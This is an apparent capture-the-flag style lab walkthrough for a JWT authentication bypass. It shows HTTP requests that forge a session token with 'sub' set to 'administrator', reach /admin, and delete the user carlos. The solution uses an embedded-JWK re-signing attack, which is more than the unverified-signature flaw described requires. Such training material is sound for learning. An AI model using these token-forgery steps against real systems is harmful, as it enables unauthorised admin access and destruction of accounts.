## JWT authentication bypass via unverified signature

This lab uses a JWT-based mechanism for handling sessions. Due to implementation flaws, the server doesn't verify the signature of any JWTs that it receives.

To solve the lab, modify your session token to gain access to the admin panel at /admin, then delete the user carlos.

You can log in to your own account using the following credentials: wiener:peter

Tip :

We recommend familiarizing yourself with how to work with JWTs in Burp Suite before attempting this lab.

## Notes

- /admin
- Search page
- Possibility to leave a comment on a post

## Resume

1. Log in to your own account.
2. Send the post-login request to Burp Repeater.
3. Change the JWT payload so `sub` becomes `administrator`.
4. Generate a new RSA key in JWT Editor.
5. Use **Attack** → **Embedded JWK** to add your public key to the token header.
6. Re-sign the JWT with your generated key.
7. Send the request to access `/admin`.
8. Copy the delete link from the admin page.
9. Delete `carlos`.

## Solve

In the lab, log in to your own account.

In Burp, go to the **Proxy > HTTP history** tab and look at the post-login `GET /my-account` request. Observe that your session cookie is a JWT.

Double-click the payload part of the token to view its decoded JSON form in the Inspector panel. Notice that the `sub` claim contains your username. Send this request to Burp Repeater.

Your original request looks like this:

```http
GET /my-account?id=wiener HTTP/2
Host: 0ac600f90407cbbf81d33e0500b9003b.web-security-academy.net
Cookie: session=eyJraWQiOiIzM2QzNDU3YS03OTg5LTQ4YjctOWViMS0xMGMxZWQ3OWQ5NzUiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3OTk1NDYyOCwic3ViIjoid2llbmVyIn0.<signature>
```

In Burp Repeater, change the path to `/admin` and send the request. Observe that the admin panel is only accessible when logged in as the `administrator` user.

The admin response contains this HTML:

```html
<section>
    <h1>Users</h1>
    <div>
        <span>wiener - </span>
        <a href="/admin/delete?username=wiener">Delete</a>
    </div>
    <div>
        <span>carlos - </span>
        <a href="/admin/delete?username=carlos">Delete</a>
    </div>
</section>
```

Open the **JWT Editor Keys** tab in Burp’s main tab bar and generate a new RSA2048 key pair.

Back in Burp Repeater, select the JWT payload and change the value of the `sub` claim from your username to `administrator`, then click **Apply changes**.

Your modified payload should look like this:

```json
{
  "iss": "portswigger",
  "exp": 1779954628,
  "sub": "administrator"
}
```

Then use the JWT Editor **Attack** option and select **Embedded JWK**. Choose the RSA key you generated. This adds a `jwk` parameter to the JWT header containing your public key.

The JWT should now be signed with your generated key and accepted by the server.

Send the request again. You should now successfully access the admin panel.

The forged admin request looks like this:

```http
GET /admin HTTP/2
Host: 0ac600f90407cbbf81d33e0500b9003b.web-security-academy.net
Cookie: session=eyJraWQiOiIzM2QzNDU3YS03OTg5LTQ4YjctOWViMS0xMGMxZWQ3OWQ5NzUiLCJhbGciOiJSUzI1NiIsImp3ayI6eyJrdHkiOiJSU0EiLCJlIjoiQVFBQiIsImtpZCI6IjMzZDM0NTdhLTc5ODktNDhiNy05ZWIxLTEwYzFlZDc5ZDk3NSIsIm4iOiIuLi4ifX0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3OTk1NDYyOCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.<new-signature>
```

The admin panel HTML will contain the delete links above. Use the `carlos` link or send this request directly:

```http
GET /admin/delete?username=carlos HTTP/2
Host: 0ac600f90407cbbf81d33e0500b9003b.web-security-academy.net
Cookie: session=<forged-jwt>
```

Send that request to solve the lab.